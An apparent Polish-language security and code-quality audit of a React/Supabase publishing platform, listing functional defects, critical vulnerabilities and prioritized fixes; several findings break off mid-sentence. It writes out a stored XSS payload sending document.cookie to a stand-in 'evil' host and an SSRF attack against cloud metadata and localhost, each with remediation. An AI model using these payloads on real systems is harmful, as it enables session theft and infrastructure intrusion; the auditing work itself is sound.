# Audyt całej platformy — architektura, moduły, bezpieczeństwo, dane, UX/UI, jakość kodu, intermodularność

**Data audytu:** 2026-07-13 · **Stan:** branch `claude/platform-audit-assessment-ul0p6h`, HEAD `29efa3e` ·
**Skala ocen:** 0–10, przyznawana surowo (punkt odniesienia: dojrzała, komercyjna, produkcyjna platforma wydawnicza — nie prototyp).

## Metodologia

Audyt przeprowadzono jako **pięć niezależnych, równoległych przeglądów** (bezpieczeństwo/RLS,
architektura/intermodularność, jakość kodu/testy, UX/UI/dostępność, inwentaryzacja modułów), przy czym
warstwa modułowa została dodatkowo rozbita na kilkanaście wyspecjalizowanych sond (bloki/builder, czat,
CRM/integracje, newsletter, płatności/auth, personalizacja/powiadomienia, multi-tenant). Każde ustalenie
oparto na **realnym kodzie (`plik:linia`)**, nie na changelogu ani na istniejących dokumentach `docs/OCENA_*`.
Wszędzie, gdzie prześledzono łańcuchy `CREATE OR REPLACE` / `DROP`, oceniano **stan końcowy** obiektu.

**Cztery najpoważniejsze ustalenia bezpieczeństwa zweryfikowano ręcznie, czytając kod na tej sesji**
(nie polegając na raportach sond). Jedno rzekome znalezisko sond (backdoor super-admina) **odrzucono** po
weryfikacji stanu końcowego migracji — patrz „Sprostowania".

Uruchomiono realnie: pełny zestaw testów (`1585 przechodzi / 2 błędy środowiskowe / 5 pominięć env-gated`),
`tsc --noEmit`, `eslint`, `knip`, `madge` (cykle importów) oraz podzbiór testów w izolowanych sondach.

Stos: **React 19.2 + TanStack Start (SSR) / Router / Query**, **Supabase 2.106** (Postgres + RLS + Auth +
Realtime + Storage), TipTap 3, dnd-kit, Zod, DOMPurify (isomorphic), i18next, Tailwind v4. Integracje
(Stripe, ElevenLabs, Resend, WordPress.com, Merydian CRM) implementowane ręcznie na `fetch`.

## Werdykt ogólny: **~7,3 / 10**

To jest **dojrzała, ambitna, realnie podłączona platforma** o rzadko spotykanej dyscyplinie inżynierskiej:
fundamenty (warstwa danych/RLS, silnik treści, multi-tenancy, szyna zdarzeń, SEO, płatności, jakość kodu)
są na poziomie **klasy komercyjnej (8–9)**. Niemal każda funkcja jest podłączona do bazy z RLS, triggerami,
funkcjami `SECURITY DEFINER`, audytem i limitami.

Ocenę ciągną w dół przede wszystkim **cztery zweryfikowane, realne podatności warstwy aplikacyjnej**
(2 krytyczne), które sprawiają, że platformy **nie należy dziś udostępniać pół-zaufanym autorom ani
adminom najemców bez ich naprawy**, a dodatkowo: warstwa UX/UI „porządna, nie wyróżniająca się" (7),
ogon **martwych/atrapowych ścieżek** (druga, martwa implementacja push; czat grupowy bez frontu; outbox
integracji i silnik workflow bez UI) oraz **brak eksportu danych (RODO)** i **niewymuszone MFA**.

Po naprawie czterech defektów krytycznych realny pułap platformy to **~8,3/10** — silnik już na to pozwala.

### 3.1 Defekty funkcjonalne (poza bezpieczeństwem) — priorytetowe

1. 🟠 **[WYSOKI] Moduły społeczności zepsute end-to-end (wzorzec „UI omija RPC/granty").** Wydarzenia, ankiety i
   Q&A mają **wzorcowe backendy** (RPC `rsvp_event`/`vote_poll`/`ask_qa_question` z kontrolą pojemności,
   anty-anchoringiem, rate-limitem), ale UI robi **surowe `insert`/`select`** zamiast wołać RPC:
   - **Wydarzenia:** `fetchPublicEvents` żąda kolumn `join_url/recording_url` **odciętych grantem** →
     Postgres odrzuca **całe** zapytanie → `/events` i `/events/$slug` **nie renderują nic** (admin lista też).
     RSVP omija `rsvp_event` (brak grantu INSERT) → zawsze pada. _Najpoważniejszy defekt funkcjonalny — blokuje
     samo wyświetlanie treści, nie tylko interakcję._
   - **Ankiety:** głos = raw insert na `poll_votes` bez grantu INSERT → pada; wyniki bez polityki staff-read → nigdy
     nie pokazują tallies. **Q&A:** „zadaj pytanie" i kolejka moderacji obie padają (brak grantu / kolumna odcięta).
     _Naprawa (przepięcie, nie przebudowa):_ skierować mutacje na RPC i przyciąć `select` do przyznanych kolumn.
     Wzorzec referencyjny: **Program kontrybutorów** (poprawnie grant-matched).

2. 🟠 **[WYSOKI] Warstwa prezentacji nie jest multi-tenant.** `site_settings` utworzone z PK `key` (nie
   `(tenant_id, key)`); RLS dostało `tenant_id`, ale PK nigdy nie zmieniono → header/footer/`theme_options`/
   `theme_design`/`font_sizes`/`reading_time`/`toc`/`key_takeaways`/`greetings` to **pojedyncze wiersze na całą
   platformę**. Drugi najemca nie utrzyma własnej prezentacji. Uśpione w single-tenant, ale to mina. _Naprawa:_ PK
   złożony `(tenant_id, key)` + `onConflict:"tenant_id,key"` we wszystkich call-site'ach.

3. **Wzorzec „zapisuje, nikt nie czyta" (martwe ustawienia).** Niezawodny heurystyk stubów. Potwierdzone greppem
   (0 konsumentów poza plikiem zapisu): `menu_primary`, Permalinks (`post_base`/`page_base`), Media-rozmiary,

### Defekty krytyczne (zweryfikowane ręcznie na tej sesji — priorytet naprawy)

1. 🔴 **[KRYTYCZNY] Stored XSS w publicznym rendererze buildera przez wyłamanie `</style>`.**
   Builder emituje CSS per-widget do `<style dangerouslySetInnerHTML>` **bez `hardenStyleCss`**
   (`WidgetView.tsx:330`; `BuilderRenderer.tsx`). `cleanCssValue` (`typographyCss.ts:21-27`) usuwa tylko
   `{ } ;`, **nie `< > /`**, więc `</style>` przetrwa. Ponieważ CSP to `script-src 'self' 'unsafe-inline'`
   (`start.ts:103`), wstrzyknięty `<script>` się wykonuje. **Atak:** autor (najniższa rola redakcyjna, może
   edytować własne posty) ustawia np. kolor sekcji na `red}</style><script>fetch('//evil/?c='+document.cookie)</script>`;
   przy każdym SSR strona zamyka `<style>` i skrypt wykonuje się dla **każdego czytelnika i admina** →
   kradzież sesji → eskalacja autor→admin. Persystentny, zero-interakcji.
   _Naprawa:_ przepuścić cały CSS buildera przez `hardenStyleCss`, sanityzować wartości (rozszerzyć
   `cleanCssValue` o `< > / }`), `CSS.escape` na id; egzekwować (nie deklarować) inwariant w `safeParseBuilderDoc`.

2. 🔴 **[KRYTYCZNY] Data-exfiltrujący SSRF w integracji CRM.** `merydian_webhook_url`/`merydian_api_base`
   walidowane tylko `z.string().url()` (`crm.functions.ts:259,261`) — bez allowlisty hosta i blokady IP
   prywatnych — potem `fetch()` serwerowy (`:680,703`), a pierwsze 200 znaków odpowiedzi zwracane wołającemu
   **przy non-2xx** (`:684-689,715-720`). **Atak:** admin najemcy (rola klienta) kieruje URL na
   `http://169.254.169.254/…` (metadane chmury) lub `http://localhost:<port>/…` i czyta odpowiedzi na błędzie —
   przekroczenie granicy klient→infrastruktura.
   _Naprawa:_ jeden „egress guard" przed każdym serwerowym `fetch` URL-a użytkownika: odrzuć zakresy
   prywatne/reserved, wymuś https, `redirect:"manual"`, przestań echować body upstreamu.

3. 🔴 **[KRYTYCZNY] Obejście paywalla przez TTS.** `post-tts.ts:198` ładuje `content_pl/content_en/blocks_data`

   brak dostępu traktować jak „nie znaleziono".

4. 🟠 **[WYSOKI] Wyciek cross-tenant w moderacji czatu.** Polityki `conversations_staff_read/delete`,

## 10. Priorytetowa mapa rekomendacji

### P0 — Krytyczne (przed jakimkolwiek udostępnieniem pół-zaufanym autorom/adminom najemców)

1. **Utwardzić `<style>` buildera** (`hardenStyleCss` + sanityzacja wartości CSS + `CSS.escape` id) — defekt #1.
2. **Egress guard SSRF** przed każdym serwerowym `fetch` URL-a użytkownika; przestać echować body upstreamu — defekt #2.
3. **Bramka entitlement w TTS** (`has_content_access` w `post-tts.ts`) — defekt #3.
4. **Predykat `tenant_id` w politykach moderacji czatu** (`20260712225933`) — defekt #4.
5. **Email endpoints fail-closed** + klient-IP z zaufanego proxy + budżet per-odbiorca (inbox-bomb/Resend).

### P1 — Wysokie

6. **[FUNKCJONALNE] Naprawić zepsute moduły społeczności** — przepiąć UI Wydarzeń/Ankiet/Q&A na RPC (`rsvp_event`/`vote_poll`/`ask_qa_question`) i przyciąć `select` do przyznanych kolumn. **Wydarzenia mają dziś zablokowany sam odczyt** — najwyższy priorytet funkcjonalny.
7. **`site_settings` → PK złożony `(tenant_id, key)`** + `onConflict:"tenant_id,key"` — odblokować multi-tenant warstwy prezentacji.
8. **CSP oparte na nonce** (usunięcie `script-src 'unsafe-inline'`) — systemowo domyka klasę XSS.
9. **Gatować telemetrię/analitykę na zgodę** (`categories.analytics`) + dodać **eksport danych RODO** (`exportMyData`).
10. **Egzekwować `aal2`** dla mutacji staffu; polityka „wymagaj MFA".
11. **Vault dla `integration_endpoints.secret`** (dziś plaintext — tam żyją klucze HMAC).
12. **Stripe:** dedup po `event.id` + guard anulowanej subskrypcji.
13. **Naprawić dryf szyny zdarzeń** (bramka emitter↔katalog; dopiąć `event.*`/`policy.*`).

### P2 — Średnie / jakość

14. **Martwe ustawienia** (wzorzec „zapisuje, nikt nie czyta"): podłączyć lub usunąć Permalinks / Media-rozmiary / `menu_primary` / Carousel Defaults / `posts_per_page`; naprawić mismatch `site_name`↔`name`; dodać `tags.name_pl/name_en`.
